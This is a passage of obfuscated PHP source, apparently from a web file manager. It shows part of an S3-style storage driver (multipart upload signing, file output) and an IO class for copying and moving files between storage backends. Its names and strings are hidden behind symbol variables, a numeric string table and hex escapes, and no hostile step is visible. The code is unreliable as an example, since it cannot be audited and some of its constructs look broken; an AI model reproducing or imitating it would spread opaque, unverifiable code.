=> $—≠®¡ñ˘, $˚üˆà•ï[191] => $this->getHost()); return $…á◊’„π; } public function multiUploadFormData($€ÚèüÕ•, $∏ûë–¨∆ = 3600) { $¸ÊÍ≈òØ =& $_SERVER[Á≈ ä ∞]; $¿≈òá´Õ = gmdate($¸ÊÍ≈òØ[1445]); $¥™›Ï˜ê = array(); $¥»Í…ñ¬ = $this->client->getUploadId($this->bucket, $€ÚèüÕ•, $¥™›Ï˜ê); if (!$¥»Í…ñ¬) { return !1; } return array($¸ÊÍ≈òØ[233] => $¥»Í…ñ¬, $¸ÊÍ≈òØ[191] => $this->getHost() . $¸ÊÍ≈òØ[18] . $this->pathEncode($€ÚèüÕ•), $¸ÊÍ≈òØ[234] => $¿≈òá´Õ, $¸ÊÍ≈òØ[104] => $€ÚèüÕ•); } public function multiUploadAuthData($∞õ•„Ñ·, $Ã∏™µΩë = array()) { $õö–é∫π =& $_SERVER[Á≈ ä ∞]; $∞ü∂‰“≤ = isset($Ã∏™µΩë[$õö–é∫π[184]]) ? $Ã∏™µΩë[$õö–é∫π[184]] : $õö–é∫π[22]; $•ùº∂‘ô = $Ã∏™µΩë[$õö–é∫π[104]]; unset($Ã∏™µΩë[$õö–é∫π[104]]); if (isset($Ã∏™µΩë[$õö–é∫π[235]])) { return $this->listUploadParts($•ùº∂‘ô, $Ã∏™µΩë); } $ªã„¶üº = array(); if (isset($Ã∏™µΩë[$õö–é∫π[1446]])) { $ªã„¶üº[$õö–é∫π[1447]] = $Ã∏™µΩë[$õö–é∫π[1446]]; } $Ì˘Ä›„û = explode($õö–é∫π[193], $this->getHost()); $‹⁄˘ú· = array($õö–é∫π[1448] => $Ì˘Ä›„û[1], $õö–é∫π[1449] => $õö–é∫π[22], $õö–é∫π[225] => $õö–é∫π[130], $õö–é∫π[1361] => $Ã∏™µΩë[$õö–é∫π[86]]); $Ì§å≥ª∫ = $õö–é∫π[238]; $ç¢’ˆòö = $õö–é∫π[18] . $this->pathEncode($•ùº∂‘ô) . $∞ü∂‰“≤; $ôÚ§õÌ¥ = $this->client->__getSignatureV4($ªã„¶üº, $‹⁄˘ú·, $Ì§å≥ª∫, $ç¢’ˆòö); if (strpos($∞ü∂‰“≤, $õö–é∫π[237]) === 0) { if (isset($ªã„¶üº[$õö–é∫π[1447]])) { $∑‘¸Ô¸Ÿ = $ªã„¶üº[$õö–é∫π[1447]]; } else { if (isset($ôÚ§õÌ¥[$õö–é∫π[1447]])) { $∑‘¸Ô¸Ÿ = $ôÚ§õÌ¥[$õö–é∫π[1447]]; } else { $∑‘¸Ô¸Ÿ = hash($õö–é∫π[1359], $õö–é∫π[22]); } } return array($õö–é∫π[243] => $ôÚ§õÌ¥[$õö–é∫π[243]], $õö–é∫π[1447] => $∑‘¸Ô¸Ÿ, $õö–é∫π[234] => $ôÚ§õÌ¥[$õö–é∫π[1450]]); } return $ôÚ§õÌ¥[$õö–é∫π[243]]; } public function listUploadParts($◊Ωù‰≥à, $Âö∫Âà≥ = array()) { $¸™ıîÉŸ =& $_SERVER[Á≈ ä ∞]; $°∫„◊£Ä = str_replace($¸™ıîÉŸ[244], $¸™ıîÉŸ[22], $Âö∫Âà≥[$¸™ıîÉŸ[184]]); $Ÿ‘Ã∞≤å = $this->client->listParts($this->bucket, $◊Ωù‰≥à, $°∫„◊£Ä); if (!$Ÿ‘Ã∞≤å) { return !1; } $∆ﬂ›µì˘ = $¸™ıîÉŸ[1451]; foreach ($Ÿ‘Ã∞≤å as $˙œ«…ûÉ) { $∆ﬂ›µì˘ .= $¸™ıîÉŸ[1452] . "\74\x50\x61\x72\164\x4e\x75\x6d\x62\x65\x72\x3e{$˙œ«…ûÉ[$¸™ıîÉŸ[1406]]}\x3c\57\120\141\x72\x74\x4e\x75\155\142\145\162\76\12" . "\74\x45\124\141\147\76{$˙œ«…ûÉ[$¸™ıîÉŸ[1407]]}\x3c\57\x45\124\x61\147\x3e\xa" . $¸™ıîÉŸ[1453]; } $∆ﬂ›µì˘ .= $¸™ıîÉŸ[1454]; $‹â…óƒç = array(); $ÿ≠Ùÿµê = explode($¸™ıîÉŸ[193], $this->getHost()); $‡≥±≈ç« = array($¸™ıîÉŸ[1448] => $ÿ≠Ùÿµê[1], $¸™ıîÉŸ[225] => $¸™ıîÉŸ[130], $¸™ıîÉŸ[1361] => strlen($∆ﬂ›µì˘)); $ﬂÎìÁ€’ = $¸™ıîÉŸ[236]; $ﬁÀÊ„¨Œ = $¸™ıîÉŸ[18] . $this->pathEncode($◊Ωù‰≥à) . $Âö∫Âà≥[$¸™ıîÉŸ[184]]; $Ω±¨áüË = $this->client->__getSignatureV4($‹â…óƒç, $‡≥±≈ç«, $ﬂÎìÁ€’, $ﬁÀÊ„¨Œ, $∆ﬂ›µì˘); return array($¸™ıîÉŸ[243] => $Ω±¨áüË[$¸™ıîÉŸ[243]], $¸™ıîÉŸ[234] => $Ω±¨áüË[$¸™ıîÉŸ[1450]], $¸™ıîÉŸ[245] => $Ÿ‘Ã∞≤å, $¸™ıîÉŸ[1447] => $Ω±¨áüË[$¸™ıîÉŸ[1447]]); } public function link($Ü—º˝ßî, $òÃû’÷∂ = array()) { return parent::link($Ü—º˝ßî, $òÃû’÷∂); } public function fileOut($Ä¿‚π∑, $∏’Æò·ò = false, $û“—ŒÎ» = false, $ˆÕÓ≤™å = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Á≈ ä ∞][1455])) { return parent::fileOutServer($Ä¿‚π∑, $∏’Æò·ò, $û“—ŒÎ», $ˆÕÓ≤™å); } parent::fileOut($Ä¿‚π∑, $∏’Æò·ò, $û“—ŒÎ», $ˆÕÓ≤™å); } public function fileOutImage($ÅÁ“êêÍ, $∞•–ù„» = 250) { if (strstr($this->endpoint, $_SERVER[Á≈ ä ∞][1455])) { return parent::fileOutImageServer($ÅÁ“êêÍ, $∞•–ù„»); } parent::fileOutImage($ÅÁ“êêÍ, $∞•–ù„»); } public function fileOutLink($˙˝¶„œµ) { $éïß·Ñó =& $_SERVER[Á≈ ä ∞]; if (substr($˙˝¶„œµ, 0, 7) == $éïß·Ñó[1328]) { $˙˝¶„œµ = $éïß·Ñó[1329] . substr($˙˝¶„œµ, 7); } header($éïß·Ñó[171] . $˙˝¶„œµ); die; } public function getHost() { $ß©”¸ôƒ =& $_SERVER[Á≈ ä ∞]; $¶∫Ò∑ïæ = str_rtrim(parent::getHost(), $ß©”¸ôƒ[18] . $this->bucket); $¶∫Ò∑ïæ = explode($ß©”¸ôƒ[193], $¶∫Ò∑ïæ); return $¶∫Ò∑ïæ[0] . $ß©”¸ôƒ[193] . $this->bucket . $ß©”¸ôƒ[20] . $¶∫Ò∑ïæ[1]; } } goto d∆ÆÕÀÓää; aµéÔàìŸÈ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ÖÁ©·˘Ç, $œä≠Ÿ´ä) { $˘˜¥µú® =& $_SERVER[Á≈ ä ∞]; $∆¢äø‘µ = $œä≠Ÿ´ä; $GLOBALS[$˘˜¥µú®[1149]] = $˘˜¥µú®[1150] . $ÖÁ©·˘Ç; Hook::trigger($˘˜¥µú®[1150] . $ÖÁ©·˘Ç . $˘˜¥µú®[1151], $∆¢äø‘µ); $Üå–› ≥ = self::driverMake($œä≠Ÿ´ä[0]); if (!$Üå–› ≥) { return !1; } if (method_exists($Üå–› ≥, $ÖÁ©·˘Ç)) { $Œ†ìŸßπ = @call_user_func_array(array($Üå–› ≥, $ÖÁ©·˘Ç), $œä≠Ÿ´ä); } else { if (method_exists($Üå–› ≥, $˘˜¥µú®[1152])) { $Œ†ìŸßπ = @call_user_func_array(array($Üå–› ≥, $ÖÁ©·˘Ç), $œä≠Ÿ´ä); } else { if (method_exists(self, $ÖÁ©·˘Ç)) { $Œ†ìŸßπ = @call_user_func_array(array(self, $ÖÁ©·˘Ç), $œä≠Ÿ´ä); } else { $Œ†ìŸßπ = call_user_func_array(array(parent, $ÖÁ©·˘Ç), $œä≠Ÿ´ä); } } } Hook::trigger($˘˜¥µú®[1150] . $ÖÁ©·˘Ç . $˘˜¥µú®[1153], $∆¢äø‘µ, $Œ†ìŸßπ); return $Œ†ìŸßπ; } public static function init($Ûﬁ¸√’) { return self::driverMake($Ûﬁ¸√’); } public static function copy($Å—Ω·∆›, $ÎØŒÄ¢™, $∏π≤ö©Î = false, $ëıéÃ´• = false) { return self::copyMoveStart($Å—Ω·∆›, $ÎØŒÄ¢™, $∏π≤ö©Î, $_SERVER[Á≈ ä ∞][564], $ëıéÃ´•); } public static function move($ŒÀÉò…Ù, $õçòñ˚—, $±æÏ√”Û = false, $ƒ¯˛√∫À = false) { return self::copyMoveStart($ŒÀÉò…Ù, $õçòñ˚—, $±æÏ√”Û, $_SERVER[Á≈ ä ∞][566], $ƒ¯˛√∫À); } private static function copyMoveStart($ª¿§ò»∫, $òô◊¿ûö, $ÑÑè˙˘», $ÏÓ£ºÎ≈, $„øÿ§≥Ï) { $Æ˙àÄµø =& $_SERVER[Á≈ ä ∞]; $”êˆª¿Ò = array($ª¿§ò»∫, $òô◊¿ûö, $ÑÑè˙˘», $„øÿ§≥Ï); Hook::trigger($Æ˙àÄµø[1150] . $ÏÓ£ºÎ≈ . $Æ˙àÄµø[1151], $”êˆª¿Ò); $©À§è÷È = self::copyMove($ª¿§ò»∫, $òô◊¿ûö, $ÑÑè˙˘», $ÏÓ£ºÎ≈, $„øÿ§≥Ï); Hook::trigger($Æ˙àÄµø[1150] . $ÏÓ£ºÎ≈ . $Æ˙àÄµø[1153], $”êˆª¿Ò, $©À§è÷È); return $©À§è÷È; } public static function saveFile($‹éùë§˚, $è›ÑÆÍó, $ÿ„πÛ«ò = true) { $®¿÷®ﬁ∫ =& $_SERVER[Á≈ ä ∞]; $≥ÅÇ∑≠Õ = self::info($è›ÑÆÍó); $›è∫Ë‡∆ = self::driverMake($‹éùë§˚); $¥ëã§Œı = self::driverMake($è›ÑÆÍó); $∑Ñ∞–ñ¿ = !1; if ($¥ëã§Œı->pathParse[$®¿÷®ﬁ∫[1154]]) { $∑Ñ∞–ñ¿ = $¥ëã§Œı; $·‚¶é√Ω = $¥ëã§Œı->pathParse[$®¿÷®ﬁ∫[1154]]; $¥ëã§Œı = self::driverMake($·‚¶é√Ω); } if ($›è∫Ë‡∆->pathParse[$®¿÷®ﬁ∫[1154]]) { $ÊÅ„Õ˚‹ = $›è∫Ë‡∆->pathParse[$®¿÷®ﬁ∫[1154]]; $›è∫Ë‡∆ = self::driverMake($ÊÅ„Õ˚‹); } $ª ∞∫Ñ« = $¥ëã§Œı->pathFather($è›ÑÆÍó); $∞¬Ã˝º© = !0; if (!$ÿ„πÛ«ò && self::driverIsSame($›è∫Ë‡∆, $¥ëã§Œı)) { $∞¬Ã˝º© = !1; } $Çæ¢¢∫ä = self::copyFile($›è∫Ë‡∆, $‹éùë§˚, $¥ëã§Œı, $ª ∞∫Ñ«, $≥ÅÇ∑≠Õ[$®¿÷®ﬁ∫[42]], $∞¬Ã˝º©); if ($∑Ñ∞–ñ¿) { $Çæ¢¢∫ä = $∑Ñ∞–ñ¿->getPathOuter($Çæ¢¢∫ä); } return $Çæ¢¢∫ä; } private static function copyMove($¸ï√ﬁØ©, $œÜçÍ∆ó, $€Ãâ∏ô¯, $‘ò⁄ä©≤, $∏ô›¡€˜ = false) { $≈—»Ä®› =& $_SERVER[Á≈ ä ∞]; if (!$¸ï√ﬁØ© || $¸ï√ﬁØ© == $≈—»Ä®›[18] || !$œÜçÍ∆ó) { return !1; } ignore_timeout(); $ƒÒÙç†‘ = self::driverMake($¸ï√ﬁØ©); $ﬁ’ÚÂŸ∆ = self::driverMake($œÜçÍ∆ó); $∑√∑Œ´Ñ = $‘ò⁄ä©≤ == $≈—»Ä®›[566]; $ΩÔ™¥‰Ç = !1; if ($ﬁ’ÚÂŸ∆->pathParse[$≈—»Ä®›[1154]]) { $ΩÔ™¥‰Ç = $ﬁ’ÚÂŸ∆; $œÜçÍ∆ó = $ﬁ’ÚÂŸ∆->pathParse[$≈—»Ä®›[1154]]; $ﬁ’ÚÂŸ∆ = self::driverMake($œÜçÍ∆ó); } if ($ƒÒÙç†‘->pathParse[$≈—»Ä®›[1154]]) { $¸ï√ﬁØ© = $ƒÒÙç†‘->pathParse[$≈—»Ä®›[1154]]; $ƒÒÙç†‘ = self::driverMake($¸ï√ﬁØ©); } self::check($ƒÒÙç†‘, $¸ï√ﬁØ©, $ﬁ’ÚÂŸ∆, $œÜçÍ∆ó); Hook::trigger($≈—»Ä®›[1155], $ƒÒÙç†‘, $¸ï√ﬁØ©, $ﬁ’ÚÂŸ∆, $œÜçÍ∆ó); $¡ï˛ƒìÏ = self::driverIsSame($ƒÒÙç†‘, $ﬁ’ÚÂŸ∆); if ($¡ï˛ƒìÏ) { if ($‘ò⁄ä©≤ == $≈—»Ä®›[566] && !method_exists($ﬁ’ÚÂŸ∆, $≈—»Ä®›[1156]) && trim($œÜçÍ∆ó, $≈—»Ä®›[18]) == trim($ﬁ’ÚÂŸ∆->pathFather($¸ï√ﬁØ©), $≈—»Ä®›[18])) { if ($ƒÒÙç†‘->pathThis($¸ï√ﬁØ©) != $∏ô›¡€˜ && !$ƒÒÙç†‘->isTypeObject()) { return $ƒÒÙç†‘->rename($¸ï√ﬁØ©, $∏ô›¡€˜); } return $ﬁ’ÚÂŸ∆->getPathOuter($¸ï√ﬁØ©); } if (method_exists($ﬁ’ÚÂŸ∆, $‘ò⁄ä©≤)) { return $ﬁ’ÚÂŸ∆->{$‘ò⁄ä©≤}($¸ï√ﬁØ©, $œÜçÍ∆ó, $€Ãâ∏ô¯, $∏ô›¡€˜); } } if ($¡ï˛ƒìÏ && $‘ò⁄ä©≤ == $≈—»Ä®›[566] && $ﬁ’ÚÂŸ∆->getType() == $≈—»Ä®›[116]) { $¡ß…”†Ó = $ﬁ’ÚÂŸ∆->movePath($¸ï√ﬁØ©, $œÜçÍ∆ó, $∏ô›¡€˜); if ($¡ß…”†Ó) { return $¡ß…”†Ó; } } $òﬂÊäÜ¥ = $ƒÒÙç†‘->isFile($¸ï√ﬁØ©); if (!$òﬂÊäÜ¥ && $ﬁ’ÚÂŸ∆->getType() == $≈—»Ä®›[765] && $ƒÒÙç†‘->getType() == $≈—»Ä®›[116]) { $¡ß…”†Ó = $ﬁ’ÚÂŸ∆->copyFolderFromIO($ƒÒÙç†‘, $¸ï√ﬁØ©, $œÜçÍ∆ó, $€Ãâ∏ô¯, $∑√∑Œ´Ñ, $∏ô›¡€˜); } else { $¡ß…”†Ó = self::copyPath($ƒÒÙç†‘, $¸ï√ﬁØ©, $ﬁ’ÚÂŸ∆, $œÜçÍ∆ó, $€Ãâ∏ô¯, $∑√∑Œ´Ñ, $òﬂÊäÜ¥, $∏ô›¡€˜); } if ($¡ß…”†Ó && $∑√∑Œ´Ñ) { $ƒÒÙç†‘->remove($¸ï√ﬁØ©); } if ($ΩÔ™¥‰Ç) { $¡ß…”†Ó = $ΩÔ™¥‰Ç->getPathOuter($¡ß…”†Ó); } return $¡ß…”†Ó; } private static function check($»À˝∆∏‘, $›¡⁄¥ø‹, $ı±¡«ÿ¶, &$¨•Ã›˜Á) { $‹¡ùæ®Ï =& $_SERVER[Á≈ ä ∞]; if (self::driverIsSame($»À˝∆∏‘, $ı±¡«ÿ¶) && $»À˝∆∏‘->isFolder($›¡⁄¥ø‹) && $»À˝∆∏‘->isParentOf($›¡⁄¥ø‹, $¨•Ã›˜Á)) { show_json(LNG($‹¡ùæ®Ï[1157]), !1); } if (!$»À˝∆∏‘->exist($›¡⁄¥ø‹)) { show_json(LNG($‹¡ùæ®Ï[115]), !1); } } private static function copyPath($·≤Ú˛ÚÒ, $¨ëá˝©á, $å◊≠ÇÏ∫, $êÄ–˘Ïß, $Ñ®∑®Äé, $ÁÀé«ä°, $Ä≠∂àﬁÏ, $…à»’ß÷ = false, $çàÎ™¸ = true) { $∑∞ƒ¶Åô =& $_SERVER[Á≈ ä ∞]; $Ÿä—Ä˚¸ = empty($…à»’ß÷) && $…à»’ß÷ !== $∑∞ƒ¶Åô[207] ? $·≤Ú˛ÚÒ->pathThis($¨ëá˝©á) : $…à»’ß÷; if ($Ñ®∑®Äé) { $˚ÀΩÚÌ‚ = $å◊≠ÇÏ∫->fileNameExist($êÄ–˘Ïß, $Ÿä—Ä˚¸); $Ñç„†‚„ = $Ÿä—Ä˚¸; $Ÿä—Ä˚¸ = $å◊≠ÇÏ∫->fileNameAuto($êÄ–˘Ïß, $Ÿä—Ä˚¸, $Ñ®∑®Äé, !$Ä≠∂àﬁÏ); if (!$˚ÀΩÚÌ‚ || $Ñç„†‚„ != $Ÿä—Ä˚¸) { $Ñ®∑®Äé = !1; } if ($çàÎ™¸ && !$Ñ®∑®Äé) { $å◊≠ÇÏ∫->_data[$∑∞ƒ¶Åô[1158]] = !0; } } if ($Ä≠∂àﬁÏ) { return self::copyFile($·≤Ú˛ÚÒ, $¨ëá˝©á, $å◊≠ÇÏ∫, $êÄ–˘Ïß, $Ÿä—Ä˚¸, $ÁÀé«ä°); } if ($Ñ®∑®Äé == REPEAT_RENAME_FOLDER) { $Ñ®∑®Äé = !1; } $Í»‰¶ﬂÜ = rtrim($êÄ–˘Ïß, $∑∞ƒ¶Åô[18]) . $∑∞ƒ¶Åô[18] . $Ÿä—Ä˚¸; $Êµ‰ùıÉ = $å◊≠ÇÏ∫->mkdir($å◊≠ÇÏ∫->getPath($Í»‰¶ﬂÜ), $Ñ®∑®Äé); $êÄ–˘Ïß = $å◊≠ÇÏ∫->getPathInner($Êµ‰ùıÉ); $™±ß‚º– = $·≤Ú˛ÚÒ->listPath($¨ëá˝©á, !0); $™±ß‚º– = is_array($™±ß‚º–) ? $™±ß‚º– : array($∑∞ƒ¶Åô[93] => array(), $∑∞ƒ¶Åô[92] => array()); $â«¡§Ã· = array_merge($™±ß‚º–[$∑∞ƒ¶Åô[93]], $™±ß‚º–[$∑∞ƒ¶Åô[92]]); foreach ($â«¡§Ã· as $ ç§Ëä) { $®πÒ›¢≤ = $ ç§Ëä[$∑∞ƒ¶Åô[43]] == $∑∞ƒ¶Åô[209]; $¨ëá˝©á = $·≤Ú˛ÚÒ->getPathInner($ ç§Ëä[$∑∞ƒ¶Åô[94]]); $Ã‘Ã¥Èø = self::copyPath($·≤Ú˛ÚÒ, $¨ëá˝©á, $å◊≠ÇÏ∫, $êÄ–˘Ïß, $Ñ®∑®Äé, $ÁÀé«ä°, $®πÒ›¢≤, !1, !1); if (!$Ã‘Ã¥Èø) { IO::errorTips($∑∞ƒ¶Åô[1159] . $¨ëá˝©á . $∑∞ƒ¶Åô[80] . $êÄ–˘Ïß); } } self::copyMoveKeepInfo($·≤Ú˛ÚÒ, $¨ëá˝©á, $Êµ‰ùıÉ); return $Êµ‰ùıÉ; } private static function copyFile($Ö’ıÙÉ¨, $ƒ˘∑◊à§, $¢¶¶àÈì, $òÈâ≠£ﬁ, $ÜÍñ”˝Æ, $Ÿø©≥Ïß) { $Âúˆ‚ìÜ =& $_SERVER[Á≈ ä ∞]; $òÈâ≠£ﬁ = $¢¶¶àÈì->getPath(rtrim($òÈâ≠£ﬁ, $Âúˆ‚ìÜ[18]) . $Âúˆ‚ìÜ[18] . $ÜÍñ”˝Æ); $¥¢ú‚ﬂÚ = $Âúˆ‚ìÜ[1160] . time() . rand_string(5); Hook::trigger($Âúˆ‚ìÜ[1161], $Ö’ıÙÉ¨, $ƒ˘∑◊à§, $¢¶¶àÈì, $òÈâ≠£ﬁ, $ÜÍñ”˝Æ, $¥¢ú‚ﬂÚ); if (self::driverIsSame($Ö’ıÙÉ¨, $¢¶¶àÈì)) { if ($Ÿø©≥Ïß) { $ÅπÙÖ˛… = $¢¶¶àÈì->moveFile($ƒ˘∑◊à§, $òÈâ≠£ﬁ); } else { $ÅπÙÖ˛… = $¢¶¶àÈì->copyFile($ƒ˘∑◊à§, $òÈâ≠£ﬁ); } Hook::trigger($Âúˆ‚ìÜ[1162], $Ö’ıÙÉ¨, $ƒ˘∑◊à§, $¢¶¶àÈì, $òÈâ≠£ﬁ, $ÜÍñ”˝Æ, $ÅπÙÖ˛…); self::copyMoveKeepInfo($Ö’ıÙÉ¨, $ƒ˘∑◊à§, $ÅπÙÖ˛…); return $ÅπÙÖ˛…; } $˛§ç⁄ÔÎ = TEMP_FILES; if ($GLOBALS[$Âúˆ‚ìÜ[16]][$Âúˆ‚ìÜ[99]][$Âúˆ‚ìÜ[803]]) { $˛§ç⁄ÔÎ = $GLOBALS[$Âúˆ‚ìÜ[16]][$Âúˆ‚ìÜ[99]][$Âúˆ‚ìÜ[803]]; } $ˆ⁄Äøºç = $˛§ç⁄ÔÎ; mk_dir($ˆ⁄Äøºç); $∏…É∂áÙ = $ˆ⁄Äøºç . $¥¢ú‚ﬂÚ; $ıÖ…Œ›˘ = $∏…É∂áÙ; $∏…É∂áÙ = $Ö’ıÙÉ¨->download($ƒ˘∑◊à§, $∏…É∂áÙ); $∏…É∂áÙ = $Ö’ıÙÉ¨->iconvApp($∏…É∂áÙ); if (substr($∏…É∂áÙ, strlen($˛§ç⁄ÔÎ)) == $˛§ç⁄ÔÎ) { $Ÿø©≥Ïß = !0; } $ÅπÙÖ˛… = $¢¶¶àÈì->upload($òÈâ≠£ﬁ, $∏…É∂áÙ, $Ÿø©≥Ïß); self::remove($ıÖ…Œ›˘); Hook::trigger($Âúˆ‚ìÜ[1162], $Ö’ıÙÉ¨, $ƒ˘∑◊à§, $¢¶¶àÈì, $òÈâ≠£ﬁ, $ÜÍñ”˝Æ, $ÅπÙÖ˛…); self::copyMoveKeepInfo($Ö’ıÙÉ¨, $ƒ˘∑◊à§, $ÅπÙÖ˛…); return $ÅπÙÖ˛…; } private static function copyMoveKeepInfo($»¶•ê¿À, $Àô∑Í€æ, $√ÄÎÃö®) { if (!$√ÄÎÃö®) { return; } $ı©ÚìõÅ = $»¶•ê¿À->info($Àô∑Í€æ); if (!is_array($ı©ÚìõÅ)) { return; } IO::setModifyTime($√ÄÎÃö®, $ı©ÚìõÅ[$_SERVER[Á≈ ä ∞][95]]); } public static function pathFather($ÜÒÃºË‘) { $ï– ú–≥ = IO::init($ÜÒÃºË‘); $ÅüÕŒ≤É = $ï– ú–≥->pathFather($ï– ú–≥->path); return $ï– ú–≥->getPathOuter($ÅüÕŒ≤É); } public static function fileOut($€∫ÉçƒÌ, $Ã¿ø–˘È = false, $˜âˆÄëË = false, $˚∑õ© ∆ = '') { $‘†¨∞Â‹ = self::driverMake($€∫ÉçƒÌ); if ($‘†¨∞Â‹->isFileOutServer()) { return $‘†¨∞Â‹->fileOutServer($€∫ÉçƒÌ, $Ã¿ø–˘È, $˜âˆÄëË, $˚∑õ© ∆); } return $‘†¨∞Â‹->fileOut($€∫ÉçƒÌ, $Ã¿ø–˘È, $˜âˆÄëË, $˚∑õ© ∆); } public static function fileOutImage($ê‹¨ñŸó, $•˘û°¢û = 250) { $ÿ˙ﬁÄ“å = array(250, 600, 1200, 2000, 3000, 5000); for ($∆áÔÉàŸ = 0; $∆áÔÉàŸ < count($ÿ˙ﬁÄ“å); $∆áÔÉàŸ++) { if ($∆áÔÉàŸ == 0 && $•˘û°¢û <= $ÿ˙ﬁÄ“å[$∆áÔÉàŸ]) { $•˘û°¢û = $ÿ˙ﬁÄ“å[$∆áÔÉàŸ]; break; } else { if ($•˘û°¢û > $ÿ˙ﬁÄ“å[$∆áÔÉàŸ - 1] && $•˘û°¢û <= $ÿ˙ﬁÄ“å[$∆áÔÉàŸ]) { $•˘û°¢û = $ÿ˙ﬁÄ“å[$∆áÔÉàŸ]; break; } else { if ($∆áÔÉàŸ == count($ÿ˙ﬁÄ“å) - 1 && $•˘û°¢û > $ÿ˙ﬁÄ“å[$∆áÔÉàŸ]) { $•˘û°¢û = $ÿ˙ﬁÄ“å[$∆áÔÉàŸ]; break; } } } } $Õﬁ•˝ñ√ = self::driverMake($ê‹¨ñŸó); if ($Õﬁ•˝ñ√->isFileOutServer()) { return $Õﬁ•˝ñ√->fileOutImageServer($ê‹¨ñŸó, $•˘û°¢û); } return $Õﬁ•˝ñ√->fileOutImage($ê‹¨ñŸó, $•˘û°¢û); } private static function driverIsSame($õ´ç¡—Ë, $´Áäüô¯) { $¶’¡ú∫ò =& $_SERVER[Á≈ ä ∞]; $¥¸ΩºÁ« = $õ´ç¡—Ë->getType(); $ÕáÙ®≥· = $´Áäüô¯->getType(); if ($¥¸ΩºÁ« != $ÕáÙ®≥·) { return !1; } if ($¥¸ΩºÁ« == $¶’¡ú∫ò[765]) { return !0; } if ($¥¸ΩºÁ« == $¶’¡ú∫ò[116]) { return !0; } if ($õ´ç¡—Ë->pathDriver == $´Áäüô¯->pathDriver) { return !0; } return !1; } public static function copyUpdate($áôœ∏Ô›, $ƒÖ≠Â¿∫) { $êÛæÂ¸Ú =& $_SERVER[Á≈ ä ∞]; if (!IO::exist($áôœ∏Ô›)) { return !1; } if (!IO::exist($ƒÖ≠Â¿∫)) { IO::mkdir($ƒÖ≠Â¿∫); } $‹Ì¨…≥Ê = self::_listAll($áôœ∏Ô›); $åß÷–¯Ù = self::_listAll($ƒÖ≠Â¿∫); $öë°”ûÿ = array(); $¥ÖÚú–ì = array(); foreach ($‹Ì¨…≥Ê as $‘“‘ãÂ« => $ä¯—àÇ©) { if (isset($åß÷–¯Ù[$‘“‘ãÂ«])) { if ($ä¯—àÇ©[$êÛæÂ¸Ú[85]] == 1) { continue; } if ($åß÷–¯Ù[$‘“‘ãÂ«][$êÛæÂ¸Ú[86]] == $ä¯—àÇ©[$êÛæÂ¸Ú[86]]) { continue; } } if ($ä¯—àÇ©[$êÛæÂ¸Ú[85]] == 1) { $¥ÖÚú–ì[] = $ƒÖ≠Â¿∫ . $êÛæÂ¸Ú[18] . $‘“‘ãÂ«; continue; } $é≠Âß‚— = strstr(trim($‘“‘ãÂ«, $êÛæÂ¸Ú[18]), $êÛæÂ¸Ú[18]) ? get_path_father($‘“‘ãÂ«) : $êÛæÂ¸Ú[22]; $öë°”ûÿ[] = array($êÛæÂ¸Ú[1163] => $ä¯—àÇ©[$êÛæÂ¸Ú[94]], $êÛæÂ¸Ú[1164] => rtrim($ƒÖ≠Â¿∫, $êÛæÂ¸Ú[18]) . $êÛæÂ¸Ú[18] . $é≠Âß‚—, $êÛæÂ¸Ú[1165] => $ä¯—àÇ©); } $È⁄ª≥î˙ = array($êÛæÂ¸Ú[209] => $öë°”ûÿ, $êÛæÂ¸Ú[85] => $¥ÖÚú–ì); Hook::trigger($êÛæÂ¸Ú[1166], $áôœ∏Ô›, $ƒÖ≠Â¿∫, $È⁄ª≥î˙); foreach ($¥ÖÚú–ì as $ä¯—àÇ©) { IO::mkdir($ä¯—àÇ©); } foreach ($öë°”ûÿ as $ä¯—àÇ©) { IO::copy($ä¯—àÇ©[$êÛæÂ¸Ú[1163]], $ä¯—àÇ©[$êÛæÂ¸Ú[1164]], REPEAT_REPLACE); } } private static function _listAll($≠ëπæˆì) { $˜π∂Ö€Ÿ =& $_SERVER[Á≈ ä ∞]; $≠ëπæˆì = KodIO::clear($≠ëπæˆì); $óÓ˝ÑõÃ = IO::listAll($≠ëπæˆì); foreach ($óÓ˝ÑõÃ as &$Ú∏˙¶ÆØ) { $ƒù≠¸® = substr($Ú∏˙¶ÆØ[$˜π∂Ö€Ÿ[94]], strlen($≠ëπæˆì)); $Ú∏˙¶ÆØ[$˜π∂Ö€Ÿ[1167]] = trim($ƒù≠¸®, $˜π∂Ö€Ÿ[18]); } unset($Ú∏˙¶ÆØ); return array_to_keyvalue($óÓ˝ÑõÃ, $˜π∂Ö€Ÿ[1167]); } public static function fileSubstr($»ŸÀƒ≈Ò, $ú—–Ωäï, $ßŸª˛“ê = false) { $”€ãôû÷ =& $_SERVER[Á≈ ä ∞]; $¬ç≤–¥· = self::driverMake($»ŸÀƒ≈Ò); $ßµ’Ù˘å = $¬ç≤–¥·->size($»ŸÀƒ≈Ò); $ò‘∆—ÛŒ = $ú—–Ωäï; $∏˛ˆøÀΩ = $ßŸª˛“ê; if ($ú—–Ωäï < 0) { $ú—–Ωäï = $ßµ’Ù˘å + $ú—–Ωäï; } if ($ßŸª˛“ê === !1) { $ßŸª˛“ê = $ßµ’Ù˘å - $ú—–Ωäï; } if ($ú—–Ωäï + $ßŸª˛“ê > $ßµ’Ù˘å) { $ßŸª˛“ê = $ßµ’Ù˘å - $ú—–Ωäï; } if (!$ßµ’Ù˘å && $¬ç≤–¥·->getType() == $”€ãôû÷[116] && !$¬ç≤–¥·->exist($»ŸÀƒ≈Ò)) { $…√¢¯¢ú = get_path_this($»ŸÀƒ≈Ò); $Çìï√¶è = parse_url_query($…√¢¯¢ú); if (is_array($Çìï√¶è) && isset($Çìï√¶è[$”€ãôû÷[42]])) { $…√¢¯¢ú = urldecode($Çìï√¶è[$”€ãôû÷[42]]); } throw new Exception($”€ãôû÷[1168] . LNG($”€ãôû÷[1169]) . $”€ãôû÷[969] . clear_html($…√¢¯¢ú) . $”€ãôû÷[22]); } if ($ßŸª˛“ê <= 0) { return $”€ãôû÷[22]; } if ($ú—–Ωäï < 0 || $ú—–Ωäï >= $ßµ’Ù˘å || $ßŸª˛“ê > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\x65\x52\x65\141\144\x20\x65\x72\162\x6f\162\x21\x20\163\164\x61\162\164\x3d{$ú—–Ωäï}\73\154\145\x6e\147\164\150\x3d{$ßŸª˛“ê}\x3b\x20\x73\151\x7a\x65\x3d{$ßµ’Ù˘å}\x3b"); } $˛ç“Ôïô = 